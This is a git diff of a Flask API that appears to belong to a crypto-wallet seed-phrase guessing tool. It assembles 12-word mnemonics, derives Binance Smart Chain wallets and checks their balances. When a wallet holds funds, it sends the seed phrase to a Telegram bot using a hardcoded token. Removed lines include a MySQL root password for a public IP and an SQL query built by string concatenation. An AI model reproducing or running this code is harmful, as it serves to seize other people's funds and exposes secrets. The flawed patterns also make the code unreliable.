@@ -2,230 +2,29 @@ from flask import Flask, jsonify, request
 from web3 import Web3
 import config
 import mysql.connector
-import random, sys, os
+import random, sys, os, json
 import validadores
 import array_palavras
 import requests
+from decimal import *
+#import resource
+#resource.setrlimit(resource.RLIMIT_AS, ((10 * 1024 * 1024 * 16),(10 * 1024 * 1024 * 16)))
+#print(resource.getrlimit(resource.RLIMIT_AS))
 
 select_em = 100
 deleta_em = 200
 
 app = Flask(__name__)
 
-livros = [
-    {
-        'id': 1,
-        'título': 'O Senhor dos Anéis - A Sociedade do Anel',
-        'autor': 'J.R.R Tolkien'
-    },
-    {
-        'id': 2,
-        'título': 'Harry Potter e a Pedra Filosofal',
-        'autor': 'J.K Howling'
-    },
-    {
-        'id': 3,
-        'título': 'James Clear',
-        'autor': 'Hábitos Atômicos'
-    },
-]
 wallet=[]
 palavras2=[]
-
-# Consultar(todos)
-@app.route('/total',methods=['GET'])
-def total():
-    mydb = mysql.connector.connect(host="191.252.60.124",user="root",password="R0n3y@c3rt3@$3nh@",database="shieldtokencoin")
-    mycursor = mydb.cursor()
-    sql = "SELECT count(*) FROM frase"
-    mycursor.execute(sql)
-    myresult = mycursor.fetchall()
-    mycursor.close()
-    mydb.close()    
-    return jsonify(myresult)
-
-
-# Consultar(todos)
-@app.route('/palavras',methods=['GET'])
-def obter_wallet():
-    mydb = mysql.connector.connect(host="191.252.60.124",user="root",password="R0n3y@c3rt3@$3nh@",database="shieldtokencoin")
-    mycursor = mydb.cursor()
-    #sql = "SELECT frase FROM (SELECT ROUND(RAND() * (SELECT MAX(id) FROM frase)) random_num, @num:=@num + 1 FROM (SELECT @num:=0) AS a, frase LIMIT "+str(select_em)+") AS b, frase AS t WHERE b.random_num = t.id"
-    sql = "SELECT frase FROM frase AS t1 JOIN (SELECT id FROM frase ORDER BY RAND() LIMIT "+str(select_em)+") as t2 ON t1.id=t2.id"
-    #sql = "SELECT frase FROM frase LIMIT "+str(select_em)+""
-    #sql = "SELECT frase FROM frase ORDER BY id DESC LIMIT "+str(select_em)+""
-    mycursor.execute(sql)
-    myresult = mycursor.fetchall()
-    mycursor.close()
-    mydb.close()    
-    return jsonify(myresult)
-
-@app.route('/validador',methods=['POST'])
-def validador():
-    server = request.get_json()
-    serv_name = server['serv_name']
-    deleta_em = server['deleta_em']
-    
-    mydb = mysql.connector.connect(host="191.252.60.124",user="root",password="R0n3y@c3rt3@$3nh@",database="shieldtokencoin")
-    mycursor = mydb.cursor()
-    sql = "INSERT INTO validadores (id,validador,total,data) VALUES (NULL, '"+serv_name+"', '"+str(deleta_em)+"', CURRENT_TIMESTAMP) ON DUPLICATE KEY UPDATE validador='"+serv_name+"', total=total+'"+str(deleta_em)+"', data=now();"
-    mycursor.execute(sql);mydb.commit();mycursor.close();mydb.close()    
-    return jsonify({"sucess": "ok"})
-
-@app.route('/inclusao_palavras',methods=['POST'])
-def inclusao_palavras():
-    palavras = request.get_json()
-    #print(palavras)
-    for p in palavras:
-        palavras2.append((str(p['mnemonic']),str(p['seq']),str(p['wallet']),str(p['wallet']),),)       
-    total_registros = len(palavras2)
-    
-    mydb = mysql.connector.connect(host="191.252.60.124",user="root",password="R0n3y@c3rt3@$3nh@",database="shieldtokencoin")
-    mycursor = mydb.cursor()
-    sql = """INSERT INTO frase (id,frase,seq,wallet,balance,data) SELECT NULL, %s, %s, %s, 'x', NOW() WHERE NOT EXISTS (SELECT wallet FROM frase WHERE wallet =%s) """
-    
-    try:
-        mycursor.executemany(sql, palavras2)
-    except:
-        try:
-            mycursor.executemany(sql, palavras2)
-        except:
-            pass
-        else:
-            mydb.commit();palavras2.clear();
-            mycursor.close();mydb.close();
-    else:
-        mydb.commit();palavras2.clear();
-        mycursor.close();mydb.close();
-
-    return jsonify({"inclusao": ""+str(total_registros)+""})
-
-
-val=[]
-@app.route('/delete_wallet',methods=['POST'])
-def delete_wallet():
-    wallet = request.get_json()
-    #print(wallet)
-    for w in wallet:
-        val.append((str(w['wallet']),),)        
-    #print(val)
-    total_registros = len(val)
-    mydb = mysql.connector.connect(host="191.252.60.124",user="root",password="R0n3y@c3rt3@$3nh@",database="shieldtokencoin")
-    mycursor = mydb.cursor()
-    sql = """DELETE FROM frase WHERE frase.wallet = %s""";
-    #print(mycursor.executemany(sql, val))
-    try:
-        mycursor.executemany(sql, val)
-    except:
-        try:
-            mycursor.executemany(sql, val)
-        except:
-            pass
-        else:
-            mydb.commit();val.clear();
-            mycursor.close();mydb.close();
-    else:
-        mydb.commit();val.clear();
-        mycursor.close();mydb.close();
-
-    return jsonify({"delete": ""+str(total_registros)+""})
-
-
-    
-
-# Consultar(id)
-@app.route('/livros/<int:id>',methods=['GET'])
-def obter_livro_por_id(id):
-    for livro in livros:
-        if livro.get('id') == id:
-            return jsonify(livro)
-# Editar
-@app.route('/livros/<int:id>',methods=['PUT'])
-def editar_livro_por_id(id):
-    livro_alterado = request.get_json()
-    for indice,livro in enumerate(livros):
-        if livro.get('id') == id:
-            livros[indice].update(livro_alterado)
-            return jsonify(livros[indice])
-
-# Excluir
-@app.route('/livros/<int:id>',methods=['DELETE'])
-def excluir_livro(id):
-    for indice, livro in enumerate(livros):
-        if livro.get('id') == id:
-            del livros[indice]
-
-    return jsonify(livros)
-
 
 w3 = Web3()
 rand = random.randint(0,32)
 web3 = Web3(Web3.HTTPProvider(validadores.bsc[int(rand)]))
 w3.eth.account.enable_unaudited_hdwallet_features()
 
-
-
-#####################################################################################################################
-@app.route('/converte_numero_em_frase_e_validade_se_sequencia_eh_valida',methods=['POST'])
-def converte_numero_em_frase_e_validade_se_sequencia_eh_valida():
-    global wallet
-    global balance
-    wallet = "none"
-    balance = "none"
-    p = request.get_json()
-    #for p in palavra:
-    #    val.append((str(p['palavra']),),)  
-    print(str(p['1'])+" "+str(p['2'])+" "+str(p['3'])+" "+str(p['4'])+" "+str(p['5'])+" "+str(p['6'])+" "+str(p['7'])+" "+str(p['8'])+" "+str(p['9'])+" "+str(p['10'])+" "+str(p['11'])+" "+str(p['12']))
-    mnemonic = str(array_palavras.p2[int(p['1'])])+" "+str(array_palavras.p2[int(p['2'])])+" "+str(array_palavras.p2[int(p['3'])])+" "+str(array_palavras.p2[int(p['4'])])+" "+str(array_palavras.p2[int(p['5'])])+" "+str(array_palavras.p2[int(p['6'])])+" "+str(array_palavras.p2[int(p['7'])])+" "+str(array_palavras.p2[int(p['8'])])+" "+str(array_palavras.p2[int(p['9'])])+" "+str(array_palavras.p2[int(p['10'])])+" "+str(array_palavras.p2[int(p['11'])])+" "+str(array_palavras.p2[int(p['12'])])
-    print(mnemonic)
-    #mnemonic = "luxury rebel tenant boat match antique drop album dress scissors pizza crop"
-    try:
-        acc = w3.eth.account.from_mnemonic(mnemonic, account_path=f"m/44'/60'/0'/0/0")
-    except:
-        pass
-    else:
-        #total_wallet=int(total_wallet+1)
-        #inicio = time.perf_counter()
-        wallet = str(acc.address)
-        #balance = web3.eth.get_balance(wallet)
-        #print("wallet "+str(wallet)+" balance "+str(balance)+" mnemonic "+str(mnemonic))
-        print("wallet "+str(wallet)+" mnemonic "+str(mnemonic))
-    return jsonify({"mnemonic":""+str(wallet)+""})
-    
-
-#####################################################################################################################
-
-
-
 @app.route('/balance',methods=['POST'])
-def balance():
-    global wallet
-    global balance
-    wallet = "none"
-    balance = "none"
-    p = request.get_json()
-    #for p in palavra:
-    #    val.append((str(p['palavra']),),)  
-    print(str(p['1'])+" "+str(p['2'])+" "+str(p['3'])+" "+str(p['4'])+" "+str(p['5'])+" "+str(p['6'])+" "+str(p['7'])+" "+str(p['8'])+" "+str(p['9'])+" "+str(p['10'])+" "+str(p['11'])+" "+str(p['12']))
-    mnemonic = str(p['1'])+" "+str(p['2'])+" "+str(p['3'])+" "+str(p['4'])+" "+str(p['5'])+" "+str(p['6'])+" "+str(p['7'])+" "+str(p['8'])+" "+str(p['9'])+" "+str(p['10'])+" "+str(p['11'])+" "+str(p['12'])
-    #mnemonic = "luxury rebel tenant boat match antique drop album dress scissors pizza crop"
-    try:
-        acc = w3.eth.account.from_mnemonic(mnemonic, account_path=f"m/44'/60'/0'/0/0")
-    except:
-        pass
-    else:
-        #total_wallet=int(total_wallet+1)
-        #inicio = time.perf_counter()
-        wallet = str(acc.address)
-        balance = web3.eth.get_balance(wallet)
-    print("wallet "+str(wallet)+" balance "+str(balance)+" mnemonic "+str(mnemonic))
-    return jsonify({"wallet": ""+str(wallet)+"","balance": ""+str(balance)+"", "mnemonic":""+str(mnemonic)+""})
-
-
-
-
-
-@app.route('/balance2',methods=['POST'])
 def balance2():
     os.system('sync; echo 3 > /proc/sys/vm/drop_caches')
     p = request.get_json()
@@ -235,7 +34,20 @@ def balance2():
     wallet = str(p['wallet'])
     balance = str(0)
     mnemonic = str(p['mnemonic'])
-    
+    print(wallet)
+
+    #ntoken=["Binance-Peg BSC-USD",                       "Binance-Peg BUSD Token",                    "Wrapped BNB",                                "Baby Doge Coin",                             "Binance-Peg Ethereum Token",                 "PancakeSwap Token",                          "Wall Street Games",                           "Binance-Peg SHIBA INU Token",                "Binance-Peg USD Coin"]                                     
+    #token= ["0x55d398326f99059fF775485246999027B3197955","0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56","0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c", "0xc748673057861a797275CD8A068AbB95A902e8de", "0x2170Ed0880ac9A755fd29B2688956BD959F933F8", "0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82", "0xA58950F05FeA2277d2608748412bf9F802eA4901", "0x2859e4544C4bB03966803b044A93563Bd2D0DD4D", "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d"]
+    #abi = json.loads('[{"constant":true,"inputs":[],"name":"name","outputs":[{"name":"","type":"string"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"spender","type":"address"},{"name":"tokens","type":"uint256"}],"name":"approve","outputs":[{"name":"success","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"totalSupply","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"from","type":"address"},{"name":"to","type":"address"},{"name":"tokens","type":"uint256"}],"name":"transferFrom","outputs":[{"name":"success","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"decimals","outputs":[{"name":"","type":"uint8"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"_totalSupply","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[{"name":"tokenOwner","type":"address"}],"name":"balanceOf","outputs":[{"name":"balance","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"symbol","outputs":[{"name":"","type":"string"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[{"name":"a","type":"uint256"},{"name":"b","type":"uint256"}],"name":"safeSub","outputs":[{"name":"c","type":"uint256"}],"payable":false,"stateMutability":"pure","type":"function"},{"constant":false,"inputs":[{"name":"to","type":"address"},{"name":"tokens","type":"uint256"}],"name":"transfer","outputs":[{"name":"success","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[{"name":"a","type":"uint256"},{"name":"b","type":"uint256"}],"name":"safeDiv","outputs":[{"name":"c","type":"uint256"}],"payable":false,"stateMutability":"pure","type":"function"},{"constant":true,"inputs":[{"name":"a","type":"uint256"},{"name":"b","type":"uint256"}],"name":"safeMul","outputs":[{"name":"c","type":"uint256"}],"payable":false,"stateMutability":"pure","type":"function"},{"constant":true,"inputs":[{"name":"tokenOwner","type":"address"},{"name":"spender","type":"address"}],"name":"allowance","outputs":[{"name":"remaining","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[{"name":"a","type":"uint256"},{"name":"b","type":"uint256"}],"name":"safeAdd","outputs":[{"name":"c","type":"uint256"}],"payable":false,"stateMutability":"pure","type":"function"},{"inputs":[],"payable":false,"stateMutability":"nonpayable","type":"constructor"},{"anonymous":false,"inputs":[{"indexed":true,"name":"from","type":"address"},{"indexed":true,"name":"to","type":"address"},{"indexed":false,"name":"tokens","type":"uint256"}],"name":"Transfer","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"name":"tokenOwner","type":"address"},{"indexed":true,"name":"spender","type":"address"},{"indexed":false,"name":"tokens","type":"uint256"}],"name":"Approval","type":"event"}]')
+    #for i in range(0,len(token)):
+    #    contract = web3.eth.contract(address=token[i], abi=abi)
+    #    balanceOf = contract.functions.balanceOf(carteira_origem).call()
+    #    b = (Decimal(balanceOf) / Decimal(10**6))
+    #    print(ntoken[i]+": "+str(b))
+    #0x7aE75C09B52bB02B41E1280B600423929a732208
+    #0x0fbE543abeC29487B56895c8a9AC909cDE2C7AE2
+    #0xd437319A06384c55D8A0D979d12a59e8DeA9D2A3
+
     
     
     #mnemonic = "luxury rebel tenant boat match antique drop album dress scissors pizza crop"
@@ -244,17 +56,18 @@ def balance2():
     except:
         pass
     else:
-        print("wallet "+str(wallet)+" balance "+str(balance)+" mnemonic "+str(mnemonic))
+        print("wallet "+str(wallet)+" balance "+str(web3.from_wei(balance,'ether'))+" mnemonic "+str(mnemonic))
         if balance != 0:
             #print(f"count: "+str('%018.0f' % total_wallet)+"/"+str('%018.0f' % count)+" - time: "+str("{:6.4f}".format(total))+" - "+str(w)+" | "+str(balance)+" | "+str(mnemonic)+" - "+str(valida_palavras_validadores.bsc[int(rand)]))     
-            payload = {'chat_id': '139945866', 'text': '🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢\n🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢\n\n\n\n\n\n\n\n\n\n\n\n\n\nPhrase:'+str(mnemonic)+' \nBalance: '+str(balance)+' \nWallet: '+str(wallet)+'\n\n\n\n\n\n\n\n\n\n\n🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢\n🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢'}
+            payload = {'chat_id': '139945866', 'text': '🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢\n🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢\n\n\n\n\n\n\n\n\n\n\n\n\n\nPhrase:'+str(mnemonic)+' \nBalance: '+str(web3.from_wei(balance,'ether'))+' \nWallet: '+str(wallet)+'\n\n\n\n\n\n\n\n\n\n\n🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢\n🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢'}
             r = requests.post("https://api.telegram.org/bot6534285154:AAEzeSG2Nvyn46uGD88VeC2eREAiW80SntA/sendMessage", data=payload)    
             #arquivo = open("wallet_"+str(id)+".txt", "a")
             #arquivo.write(str(p1)+" "+str(p2)+" "+str(p3)+" "+str(p4)+" "+str(p5)+" "+str(p6)+" "+str(p7)+" "+str(p8)+" "+str(p9)+" "+str(p10)+" "+str(p11)+" "+str(p12)+"\n")                                    
-    return jsonify({"wallet": ""+str(wallet)+"","balance": ""+str(balance)+"", "mnemonic":""+str(mnemonic)+""})
+    return jsonify({"wallet": ""+str(wallet)+"","balance": ""+str(web3.from_wei(balance,'ether'))+"", "mnemonic":""+str(mnemonic)+""})
+    sys.exit()
     
 PORTA=int(sys.argv[1])
 os.system('sync; echo 3 > /proc/sys/vm/drop_caches')
 app.run(host='0.0.0.0',port=PORTA,debug=True)
 os.system('sync; echo 3 > /proc/sys/vm/drop_caches')
-#C:/Users/roney/AppData/Local/Programs/Python/Python311/python.exe c:/Users/roney/Desktop/Automatizacao_Python/v8/app.py 80
+#C:/Users/roney/AppData/Local/Programs/Python/Python311/python.exe c:/Users/roney/Documents/GitHub/python_bsc/api.py 80
